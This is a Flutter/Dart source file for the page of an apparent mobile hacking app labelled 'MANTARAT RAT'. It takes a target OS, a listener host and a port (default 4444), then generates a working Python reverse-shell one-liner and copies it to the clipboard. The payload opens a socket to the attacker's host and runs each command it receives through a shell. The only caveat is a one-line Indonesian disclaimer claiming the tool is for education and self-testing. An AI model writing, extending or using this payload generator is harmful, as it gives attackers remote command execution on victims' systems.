import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

class MantaratPage extends StatefulWidget {
  final String sessionKey;
  const MantaratPage({super.key, required this.sessionKey});

  @override
  State<MantaratPage> createState() => _MantaratPageState();
}

class _MantaratPageState extends State<MantaratPage> {
  static const Color _bg = Color(0xFF060B14);
  static const Color _card = Color(0xFF0D1B2A);
  static const Color _orange = Color(0xFFFF5722);
  static const Color _border = Color(0xFF1A2E3A);

  final _targetController = TextEditingController();
  final _portController = TextEditingController(text: '4444');

  String _selectedType = 'Android';
  final _types = ['Android', 'Windows', 'Linux'];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      appBar: AppBar(
        backgroundColor: _bg,
        leading: IconButton(icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white), onPressed: () => Navigator.pop(context)),
        title: const Text('MANTARAT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 2)),
        bottom: PreferredSize(preferredSize: const Size.fromHeight(1), child: Container(color: _border, height: 1)),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: _card, borderRadius: BorderRadius.circular(16), border: Border.all(color: _orange.withAlpha(80))),
            child: Row(children: [
              Container(width: 48, height: 48, decoration: BoxDecoration(color: _orange.withAlpha(30), borderRadius: BorderRadius.circular(12)), child: const Icon(Icons.bug_report_rounded, color: _orange, size: 24)),
              const SizedBox(width: 12),
              const Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text('MANTARAT RAT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
                Text('Remote Access Tool - Pairing & Configuration', style: TextStyle(color: Colors.white54, fontSize: 12)),
              ])),
            ]),
          ),
          const SizedBox(height: 20),
          Container(
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(color: Colors.orange.withAlpha(15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.orange.withAlpha(40))),
            child: const Row(children: [
              Icon(Icons.warning_amber_rounded, color: Colors.orange, size: 18),
              SizedBox(width: 8),
              Expanded(child: Text('Hanya untuk keperluan edukasi dan testing pada perangkat sendiri.', style: TextStyle(color: Colors.orange, fontSize: 12))),
            ]),
          ),
          const SizedBox(height: 24),
          const Text('Target Type', style: TextStyle(color: Colors.white70, fontSize: 13, letterSpacing: 1)),
          const SizedBox(height: 8),
          Row(children: _types.map((t) {
            final sel = t == _selectedType;
            return Padding(
              padding: const EdgeInsets.only(right: 10),
              child: GestureDetector(
                onTap: () => setState(() => _selectedType = t),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                  decoration: BoxDecoration(color: sel ? _orange : _card, borderRadius: BorderRadius.circular(30), border: Border.all(color: sel ? _orange : _border)),
                  child: Text(t, style: TextStyle(color: sel ? Colors.white : Colors.white60, fontWeight: FontWeight.bold, fontSize: 12)),
                ),
              ),
            );
          }).toList()),
          const SizedBox(height: 20),
          const Text('Listener Host (IP/Domain)', style: TextStyle(color: Colors.white70, fontSize: 13, letterSpacing: 1)),
          const SizedBox(height: 8),
          Container(
            decoration: BoxDecoration(color: _card, borderRadius: BorderRadius.circular(12), border: Border.all(color: _border)),
            child: TextField(
              controller: _targetController,
              style: const TextStyle(color: Colors.white),
              decoration: const InputDecoration(
                hintText: 'ex: 192.168.1.1 atau domain.com',
                hintStyle: TextStyle(color: Colors.white38),
                prefixIcon: Icon(Icons.dns_rounded, color: Colors.white38),
                border: InputBorder.none,
                contentPadding: EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              ),
            ),
          ),
          const SizedBox(height: 14),
          const Text('Port', style: TextStyle(color: Colors.white70, fontSize: 13, letterSpacing: 1)),
          const SizedBox(height: 8),
          Container(
            decoration: BoxDecoration(color: _card, borderRadius: BorderRadius.circular(12), border: Border.all(color: _border)),
            child: TextField(
              controller: _portController,
              style: const TextStyle(color: Colors.white),
              keyboardType: TextInputType.number,
              inputFormatters: [FilteringTextInputFormatter.digitsOnly],
              decoration: const InputDecoration(
                hintText: '4444',
                hintStyle: TextStyle(color: Colors.white38),
                prefixIcon: Icon(Icons.router_rounded, color: Colors.white38),
                border: InputBorder.none,
                contentPadding: EdgeInsets.symmetric(horizontal: 16, vertical: 14),
              ),
            ),
          ),
          const SizedBox(height: 24),
          SizedBox(
            width: double.infinity,
            child: ElevatedButton.icon(
              onPressed: () {
                final host = _targetController.text.trim();
                final port = _portController.text.trim();
                if (host.isEmpty || port.isEmpty) {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Isi semua field terlebih dahulu')));
                  return;
                }
                final payload = 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"$host\\",$port));[subprocess.run(c,shell=True,stdout=s.makefile(\'wb\'),stderr=subprocess.STDOUT) for c in iter(s.recv(1024).decode,\'exit\')]"';
                Clipboard.setData(ClipboardData(text: payload));
                ScaffoldMessenger.of(context).showSnackBar(const SnackBar(backgroundColor: Colors.green, content: Text('Payload disalin ke clipboard!')));
              },
              style: ElevatedButton.styleFrom(backgroundColor: _orange, foregroundColor: Colors.white, padding: const EdgeInsets.symmetric(vertical: 14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
              icon: const Icon(Icons.copy_rounded),
              label: const Text('GENERATE & COPY PAYLOAD', style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1)),
            ),
          ),
        ]),
      ),
    );
  }
}
